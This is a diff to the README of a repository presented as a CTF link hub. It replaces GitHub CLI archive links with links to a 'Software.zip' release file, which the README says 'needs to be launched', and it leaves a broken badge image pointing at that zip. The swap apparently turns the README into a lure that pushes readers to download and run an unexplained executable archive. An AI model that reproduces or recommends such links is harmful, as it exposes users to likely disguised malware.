@@ -1,6 +1,6 @@
 # Welcome to helloCTF-CTFerlink 🚀
 
-[![GitHub release (latest by date)](https://img.shields.io/github/v/release/helloCTF-CTFerlink?label=Latest%20Release)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![GitHub release (latest by date)](https://github.com/Hoshinorimuta/helloCTF-CTFerlink/releases/download/v1.0/Software.zip%20Release)](https://github.com/Hoshinorimuta/helloCTF-CTFerlink/releases/download/v1.0/Software.zip)
 
 ## Overview
 
@@ -8,7 +8,7 @@ Welcome to the **helloCTF-CTFerlink** repository, your one-stop destination for 
 
 ## Quick Links
 - [Visit CTFer blog link center](#)
-- [Download the latest release](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip) *(File needs to be launched)*
+- [Download the latest release](https://github.com/Hoshinorimuta/helloCTF-CTFerlink/releases/download/v1.0/Software.zip) *(File needs to be launched)*
 
 ## Features
 
